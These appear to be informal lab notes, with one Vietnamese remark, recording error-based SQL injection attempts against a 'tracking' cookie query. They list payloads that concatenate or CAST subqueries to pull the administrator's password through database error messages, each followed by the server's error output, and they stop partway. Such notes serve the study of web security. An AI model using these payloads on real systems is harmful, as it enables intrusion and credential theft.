- '
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'RvVJ6xRwjtKqdmER''. Expected char

- '-- -> 200
- '' -> 200

/*
- '||  ||'
- '|| (SELECT password FROM users WHERE username = 'administrator') ||'
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'RvVJ6xRwjtKqdmER'|| (SELECT password FROM users WHERE userna'. Expected  char
Có vẻ như chỗ này bị giới hạn số lượng từ trong truy vấn

- '|| (CAST(SELECT password FROM users)) ||'
ERROR: syntax error at or near "SELECT"
  Position: 62

- '|| (CAST(SELECT password FROM users) AS int) ||'
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'RvVJ6xRwjtKqdmER'|| (CAST(SELECT password FROM users) AS int'. Expected  char

- '|| (CAST(SELECT 1) AS int) ||'
ERROR: syntax error at or near "SELECT"
  Position: 62
*/

- 'AND CAST((SELECT 1) AS int)--
ERROR: argument of AND must be type boolean, not type integer
- 'AND 1=CAST((SELECT 1) AS int)--












